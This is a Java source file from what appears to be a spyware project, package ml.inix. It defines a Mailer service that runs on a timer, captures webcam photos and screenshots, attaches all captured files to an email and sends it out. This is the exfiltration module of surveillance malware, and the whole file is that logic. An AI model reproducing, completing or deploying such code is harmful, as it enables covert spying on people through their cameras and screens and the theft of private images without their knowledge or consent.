package ml.inix.service;

import ml.inix.Config;
import ml.inix.loggers.Screenshot;
import ml.inix.loggers.Webcamera;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

public class Mailer implements Runnable{

    private Thread thread;

    public Mailer() {
        this.thread = new Thread(this, "Mail Service");
        thread.start();
    }

    @Override
    public void run() {
        Timer timer = new Timer();
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                composeAndSend();
            }
        }, Config.TIMEOUT*1000L, Config.TIMEOUT*1000L);
    }

    private void composeAndSend() {
        Webcamera.capture();
        Screenshot.capture();

        Email email = new Email();

        File folder = new File(Config.PATH_WEBCAM);
        File[] subFiles = folder.listFiles();
        if (subFiles != null) {
            for (File f : subFiles) {
                email.addAttachment(f.getPath(), "Camera");
            }
        }

        folder = new File(Config.PATH_SCREENSHOT);
        subFiles = folder.listFiles();
        if (subFiles != null) {
            for (File f : subFiles) {
                email.addAttachment(f.getPath(), "Screenshot");
            }
        }

        email.send();
    }
}
